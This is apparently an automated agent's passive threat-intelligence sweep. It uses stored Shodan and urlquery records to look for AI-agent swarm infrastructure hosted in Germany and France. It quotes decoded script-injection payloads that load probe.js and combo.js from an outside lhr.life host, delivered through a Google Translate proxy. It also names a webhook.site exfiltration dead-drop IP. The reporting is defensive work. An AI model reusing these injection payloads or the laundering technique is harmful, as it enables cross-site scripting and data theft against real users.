# INFRA-TRACKER — DE/FR hosting-ASN agent-infra sweep

**Worker:** infra-tracker · **Date:** 2026-10-05 · **Session:** EUROSWARM wave 1
**Method:** Shodan stored observations ONLY (search/count/host/dns — never touched a host, no active probing). urlquery via `uq_htmx.py` (8 queries, 70s pacing, no 429s hit).
**ASNs swept:** Hetzner AS24940 (DE), OVH SAS AS16276 (FR), Scaleway AS12876 (FR).

## Shodan queries run (counts)

| Query | Count |
|---|---|
| `org:"Hetzner" port:8080` | 71,125 |
| `org:"Hetzner" port:3000` | 52,930 |
| `org:"Hetzner" port:8000` | 57,831 |
| `asn:AS24940` (total hosts) | 5,072,990 |
| `org:"Hetzner" agent` | 63,333 |
| `org:"Hetzner" webhook` | 131 |
| `org:"Hetzner" tunnel` | 539 (mostly L2TP port-1701 keyword matches) |
| `org:"Hetzner" mcp` | 132 |
| `org:"Hetzner" http.title:"webhook"` | 109 |
| `org:"Hetzner" http.title:"n8n"` | 45 |
| `org:"Hetzner" http.title:"Open WebUI"` | 1,253 |
| `org:"Hetzner" http.title:"Langflow"` | 6 |
| `org:"Hetzner" http.title:"flowise"` | 158 |
| `org:"Hetzner" http.title:"mcp"` | 132 |
| `org:"Hetzner" http.title:"agent"` | 1,536 |
| `org:"Hetzner" http.title:"swarm"` | 92 |
| `org:"Hetzner" http.title:"Swarm - Login"` (global) | 108 |
| `org:"Hetzner" http.title:"OpenClaw"` | 1,566 |
| `org:"Hetzner" http.title:"letta"` | 4 |
| `org:"Hetzner" http.title:"crewai"` | 0 |
| `org:"Hetzner" http.title:"portainer"` | 11,512 |
| `org:"Hetzner" http.title:"Assistent"` | 109 |
| `org:"Hetzner" http.html:"KI-Agent"` | 26 |
| `org:"Hetzner" duckdns` | 0 |
| `org:"Hetzner" product:"cloudflared"` | 0 |
| `org:"Hetzner" product:"frp"` | 0 |
| `org:"Hetzner" trycloudflare` / `ssl:"*.trycloudflare.com"` | 0 / 0 |
| `org:"OVH SAS" http.title:"agent"` | 297 |
| `org:"OVH SAS" http.title:"mcp"` | 29 |
| `org:"OVH SAS" http.title:"webhook"` | 15 |
| `org:"OVH SAS" http.title:"Assistant IA"` | 36 |
| `org:"OVH SAS" port:3000 product:"AnythingLLM"` | 1 |
| `asn:AS16276 http.title:"webhook"` | 30 |
| `asn:AS16276 tunnel` | 356 (mostly L2TP/1701 + PPTP/1723) |
| `org:"Scaleway" http.title:"agent"` | 58 |
| `org:"Scaleway" http.title:"mcp"` | 3 |
| `asn:AS12876 http.title:"webhook"` | 1 |

## LEAD: webhook.site app node is the June-21 exfil receiver

**OBSERVED (Shodan stored host record, `last_update` 2026-10-03T09:01:31):**
- IP `178.63.67.153` — org Hetzner Online GmbH, ASN AS24940
- hostnames: `app04.webhook.site`, `webhook.site`; domains: `webhook.site`
- ports 80/443 nginx, title: "Webhook.site - Test, transform and automate Web requests and emails"; port 22 OpenSSH

**INFERENCE:** the June-21 burst exfil target `178-63-67-153.sslip.io` (prior truth) is a webhook.site application server. Exfil went to a **public webhook dead-drop service hosted on Hetzner** — consistent with the known webhook dead-drop tradecraft, and confirms Hetzner's historical role as dead-drop infra, not as an agent-operator host. Grade: **LEAD** (confirms the dead-drop mechanism; does not indicate a DE/FR swarm).

## LEAD: MCP-INDEX panel on Hetzner

**OBSERVED (stored, 2026-10-05T00:54:25):**
- IP `62.238.22.120`, Hetzner Online GmbH, AS24940 (Shodan geo: Amsterdam, NL)
- hostnames: only `static.120.22.238.62.clients.your-server.de` (no branded hostname)
- ports: 22 OpenSSH, 80, 443 (product "Ncat http proxy"), **3000 title "MCP-INDEX"**, 3001 open (no title)

**INFERENCE:** an MCP tool/registry index on an agent-stack port with no commercial branding and an Ncat HTTP proxy on 443 — agent-shaped infra. Not tied to any known fleet grammar. Grade: **LEAD**. (No contact made; recommend banner-watch only.)

## LEAD: OVH self-hosted container stack with private Docker registry

**OBSERVED (stored, 2026-10-05T12:07:10):**
- IP `37.187.71.48`, OVH SAS, AS16276, hostname `ns31603141.ip-37-187-71.eu`
- ports: 22, 80 nginx default, 443, **5000 "Docker Registry HTTP API"**, 8081, 8200 title "Backup", **9443 Portainer**

**INFERENCE:** container-orchestration + private image registry = harness-shaped infra (agent image distribution surface). Generic self-hosting pattern; no swarm grammar. Grade: **LEAD** (weak).

## Agent-shaped but COMMERCIAL (honest negatives for swarm purposes)

- **Hermes Agent clusters:** `65.21.239.165` (Hetzner, 20+ "Hermes Agent - Dashboard" ports 9120–9166 + Prometheus 9090), plus OVH instances (`51.210.4.201`, `164.132.105.226`, `51.254.202.94`, `51.254.180.105`, `51.91.102.234`, … port 9119) and Scaleway (`51.15.238.160`, `195.154.205.53`, `212.47.254.172` — `hermes-agent.infra-cloud2.arte.tv`, `51.159.97.98`). OBSERVED: "Hermes Agent" is Shodan's product fingerprint for the **Hermes sales-AI messaging agent platform** dashboards (customers: yakorank.com, wetopi.net, evozen.fr, arte.tv …). INFERENCE: commercial chatbot infrastructure, **not** a clandestine swarm. Grade: **HONEST NEGATIVE** (agent-shaped, excluded).
- **`*swarm.thqxdg.com`:** `alkimiaswarm.thqxdg.com` → 168.119.174.206:443 title "Swarm - Login"; `campfireswarm.thqxdg.com` → 91.99.230.33:443 title "Swarm - Login" (both Hetzner AS24940, `last_update` 2026-10-04 / 2026-09-29). DNS (stored) shows ~12 `*swarm` subdomains (alkimiaswarm, campfireswarm, elvswarm, galileoswarm, powswarm, studiotwoswarm, swarm-ashborne-1, swarm-tq2, tempestswarm, tq2swarm) alongside gate21/shopware/jitsi/mattermost. Global count for title "Swarm - Login": 108. INFERENCE: an IT-service provider's multi-tenant instance of a generic "Swarm" product (event/venue or project-management naming per customer), not agent orchestration. Grade: **HONEST NEGATIVE**.
- **n8n / Langflow / Flowise / Open WebUI / Letta / AnythingLLM / MCP endpoints:** all resolve to named commercial SaaS or branded self-hosters (e.g. `mcp.openagenda.com`, `mcp.kulig-gruppe.de`, `agents.accelerandos.com` (Letta), `app.winsevers.net`). The unnamed :3000/:8000/:8080 agent-title hosts checked (157.180.4.221 = suspended cPanel; 95.216.63.42 = api.fixpert.fonitex.com multi-service box). DE/FR-language panels (legalgenius.de, my-calls.ai, machmal.ai, anfragenautopilot.de, kn-agent.de) = German commercial AI chatbots. Grade: **HONEST NEGATIVE**.
- **OVH "agent" (297):** French business agent portals + Hermes customers. **Scaleway "agent" (58):** French AI startups (chut.chat, agentmaurice.app, substi.ai, lawve.ai, typewriting.ai, agentorio.net). All commercial. Grade: **HONEST NEGATIVE**.
- **OpenClaw on Hetzner (1,566):** `docs.openclaw.ai` mirrors + self-hosted instances; no swarm cluster pattern found in sampled page-1. Grade: **HONEST NEGATIVE** (broad keyword match).
- **`yas-trader.duckdns.org` → 178.104.209.12:443 (Hetzner):** dynamic-DNS "trader" host; agent-shaped egress pattern but single isolated host, no fleet grammar. Grade: **LEAD** (weak, log only).

## urlquery leg (polite: 8 queries, 70s spacing, zero 429s)

| # | Query | Result |
|---|---|---|
| 1 | `url.domain:your-server.de httpbun` | 0 |
| 2 | `httpbun agent` | 5 reports |
| 3 | `webhook your-server.de` | 0 |
| 4 | `openclaw hetzner` | 0 |
| 5 | `llms.txt hetzner` | 1 (docs.openclaw.ai/updating, 2026-04-11 — incidental keyword match) |
| 6 | `mcp your-server.de` | 0 |
| 7 | `uqscan berlin` | 0 — **closes prior-art OPEN item from german-hunt** |
| 8 | `tunnel your-server.de` | 0 |

**Q2 detail (5 reports, OBSERVED):** submissions of Google-Translate-proxied `httpbun-com.translate.goog/base64/<B64>?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&uqn=<nonce>` (4 dated 2026-10-04/05, 1 dated 2026-06-21). Decoded payloads:
- `<body id=x><script src=//a2372f6e092e1f.lhr.life/probe.js></script>`
- `<script src="https://a2372f6e092e1f.lhr.life/probe.js"></script>`
- `<script src="https://a2372f6e092e1f.lhr.life/combo.js"></script>`

Report IDs: `2b6b941f-4409-4bb6-a9f4-8d2ae14727f2`, `10ab12df-0a18-4c9d-a86e-79469ab559a7`, `9cdc930c-5a8c-41e7-aeb2-6f99b0d1dcd5`, `c4ed2904-74e6-4c22-ad0e-19105bcb2628`, `31b603f8-a1ec-465b-b2dc-eb5cf178c439`.

INFERENCE: a script-injection "probe.js" beacon family using translate.goog to launder delivery and `.lhr.life` (Life TLD) C2-ish hosts — agent/malware-shaped beacon grammar, but **different family from the Amap fleet** (no zz/oai/epoch markers; no DE/FR ASN link established — target IPs not in Hetzner/OVH/Scaleway ranges observed). Grade: **LEAD** (agent-shaped, unlinked; distinct campaign note for the corpus).

## Undocumented endpoints found (for reuse)

- Shodan CLI at `~/workspace/skills/shodan/bin/shodan.py` supports `host <ip> --full` (12k-char truncated dump) and slim host (6000-char truncation — can cut JSON mid-string; parse with `strict=False` and guard for truncation).
- urlquery htmx endpoint supports compound queries like `url.domain:your-server.de httpbun`; returns empty for zero-hit; `uqscan berlin` syntax valid.

## Open items

1. MCP-INDEX host `62.238.22.120:3000` — banner-watch candidate (never touch).
2. `yas-trader.duckdns.org` (178.104.209.12) — isolated, log only.
3. probe.js family (`.lhr.life`) — needs a corpora check for `lhr.life` / translate.goog-laundered submissions.
4. OVH Portainer/registry host 37.187.71.48 — weak LEAD, log only.
5. No DE/FR ASN link found between any agent-shaped infra and known fleet markers (Tencent/Cloud-Norway/Firefox-134 grammars). **Net verdict: no evidence of a DE/FR-hosted agent swarm in this sweep; Hetzner shows as dead-drop/tunnel-adjacent infra, not operator infra.**
